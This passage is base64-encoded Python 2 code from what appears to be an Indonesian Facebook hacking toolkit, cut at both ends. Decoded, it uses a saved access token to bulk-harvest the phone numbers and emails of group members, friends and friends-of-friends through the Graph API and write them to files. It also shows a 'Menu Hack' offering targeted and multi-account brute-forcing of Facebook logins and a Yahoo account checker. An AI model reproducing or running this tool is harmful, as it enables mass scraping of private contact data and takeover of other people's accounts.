iXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCWR1bXAoKQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBncm91cCBtZW1iZXIgcGhvbmUgbnVtYmVyIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWJ6ID0gb3Blbignb3V0L25vX21lbWJlcl9ncnVwLnR4dCcsJ3cnKQoJCXJlPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnL21lbWJlcnM/ZmllbGRzPW5hbWUsaWQmbGltaXQ9OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJCXM9anNvbi5sb2FkcyhyZS50ZXh0KQoJCWZvciBhIGluIHNbJ2RhdGEnXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIithWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJdHJ5OgoJCQkJbm9tZW0uYXBwZW5kKHpbJ21vYmlsZV9waG9uZSddKQoJCQkJYnoud3JpdGUoelsnbW9iaWxlX3Bob25lJ10gKyAnXG4nKQoJCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4obm9tZW0pKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJYnouY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IHBob25lIG51bWJlciBmcm9tIG1lbWJlciBncm91cCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4obm9tZW0pKQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKCQlvcy5yZW5hbWUoJ291dC9ub19tZW1iZXJfZ3J1cC50eHQnLCdvdXQvJytkb25lKQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQlrZWx1YXIoKQoJCQojIyMjIyBFTUFJTCAjIyMjIwpkZWYgZW1haWwoKToKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJYSA9IGpzb24ubG9hZHMoci50ZXh0KQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIGVtYWlsIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWJ6ID0gb3Blbignb3V0L2VtYWlsX3RlbWFuLnR4dCcsJ3cnKQoJCWZvciBpIGluIGFbJ2RhdGEnXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJdHJ5OgoJCQkJZW0uYXBwZW5kKHpbJ2VtYWlsJ10pCgkJCQliei53cml0ZSh6WydlbWFpbCddICsgJ1xuJykKCQkJCXByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGVtKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIit6WydlbWFpbCddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJYnouY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGVtYWlsIFwwMzNbMTs5N20uLi4uJwoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgRW1haWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGVtKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvZW1haWxfdGVtYW4udHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJa2VsdWFyKCkKCiMjIyMjIEVNQUlMIEZST00gVEVNQU4gIyMjIyMKZGVmIGVtYWlsZnJvbV90ZW1hbigpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCQl0cnk6CgkJCWpvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKCQkJb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCWR1bXAoKQoJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWR0KycvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlhID0ganNvbi5sb2FkcyhyLnRleHQpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgZW1haWwgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJYnogPSBvcGVuKCdvdXQvZW1fdGVtYW5fZnJvbV90ZW1hbi50eHQnLCd3JykKCQlmb3IgaSBpbiBhWydkYXRhJ106CgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCXRyeToKCQkJCWVtZnJvbXRlbWFuLmFwcGVuZCh6WydlbWFpbCddKQoJCQkJYnoud3JpdGUoelsnZW1haWwnXSArICdcbicpCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihlbWZyb210ZW1hbikpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrelsnZW1haWwnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQkJZXhjZXB0IEtleUVycm9yOgoJCQkJcGFzcwoJCWJ6LmNsb3NlKCkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBlbWFpbCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIEVtYWlsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihlbWZyb210ZW1hbikpCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQoJCW9zLnJlbmFtZSgnb3V0L2VtX3RlbWFuX2Zyb21fdGVtYW4udHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJa2VsdWFyKCkKCQkKIyMjIyMgTk9NRVIgIyMjIyMKZGVmIG5vbW9yX2hwKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIG51bWJlciBwaG9uZSBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQl1cmw9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0CgkJciA9cmVxdWVzdHMuZ2V0KHVybCkKCQl6PWpzb24ubG9hZHMoci50ZXh0KQoJCWJ6ID0gb3Blbignb3V0L25vbWVyX3RlbWFuLnR4dCcsJ3cnKQoJCWZvciBuIGluIHpbImRhdGEiXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIituWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJdHJ5OgoJCQkJaHAuYXBwZW5kKHpbJ21vYmlsZV9waG9uZSddKQoJCQkJYnoud3JpdGUoelsnbW9iaWxlX3Bob25lJ10gKyAnXG4nKQoJCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oaHApKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJYnouY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IG51bWJlciBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaHApKQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKCQlvcy5yZW5hbWUoJ291dC9ub21lcl90ZW1hbi50eHQnLCdvdXQvJytkb25lKQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQlrZWx1YXIoKQoKIyMjIyMgTk9NRVIgRlJPTSBURU1BTiAjIyMjIwpkZWYgaHBmcm9tX3RlbWFuKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCWlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZnJpZW5kIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJCXRyeToKCQkJam9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQlvcCA9IGpzb24ubG9hZHMoam9rLnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK29wWyJuYW1lIl0KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJZHVtcCgpCgkJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZHQrJy9mcmllbmRzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkKCQlqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBudW1iZXIgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJYnogPSBvcGVuKCdvdXQvbm9fdGVtYW5fZnJvbV90ZW1hbi50eHQnLCd3JykKCQlmb3IgaSBpbiBhWydkYXRhJ106CgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCXRyeToKCQkJCWhwZnJvbXRlbWFuLmFwcGVuZCh6Wydtb2JpbGVfcGhvbmUnXSkKCQkJCWJ6LndyaXRlKHpbJ21vYmlsZV9waG9uZSddICsgJ1xuJykKCQkJCXByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGhwZnJvbXRlbWFuKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIit6Wydtb2JpbGVfcGhvbmUnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQkJZXhjZXB0IEtleUVycm9yOgoJCQkJcGFzcwoJCWJ6LmNsb3NlKCkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBudW1iZXIgXDAzM1sxOzk3bS4uLi4nCgkJcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBOdW1iZXIgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGhwZnJvbXRlbWFuKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvbm9fdGVtYW5fZnJvbV90ZW1hbi50eHQnLCdvdXQvJytkb25lKQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQlrZWx1YXIoKQogICAgCiMjIyMjIE1FTlUgSEFDSyAjIyMjIwpkZWYgbWVudV9oYWNrKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIE1pbmkgSGFjayBGYWNlYm9vayhcMDMzWzE7OTJtVGFyZ2V0XDAzM1sxOzk3bSkiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBNdWx0aSBCcnV0ZWZvcmNlIEZhY2Vib29rIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLlwwMzNbMTs5N20gU3VwZXIgTXVsdGkgQnJ1dGVmb3JjZSBGYWNlYm9vayIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIEJydXRlRm9yY2UoXDAzM1sxOzkybVRhcmdldFwwMzNbMTs5N20pIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gWWFob28gQ2hlY2tlciIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJaGFja19waWxpaCgpCiMtLS0tcGlsaWgKZGVmIGhhY2tfcGlsaWgoKToKCWhhY2sgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKCWlmIGhhY2s9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWhhY2tfcGlsaWgoKQoJZWxpZiBoYWNrID09IjEiOgoJCW1pbmkoKQoJZWxpZiBoYWNrID09IjIiOgoJCWNyYWNrKCkKCQloYXNpbCgpCgllbGlmIGhhY2sgPT0iMyI6CgkJc3VwZXIoKQoJZWxpZiBoYWNrID09IjQiOgoJCWJydXRlKCkKCWVsaWYgaGFjayA9PSI1IjoKCQltZW51X3lhaG9vKCkKCWVsaWYgaGFjayA9PSIwIjoKCQltZW51KCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJaGFja19waWxpaCgpCgkJCiMjIyMjIE1JTkkgSEYgIyMjIyMKZGVmIG1pbmkoKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kI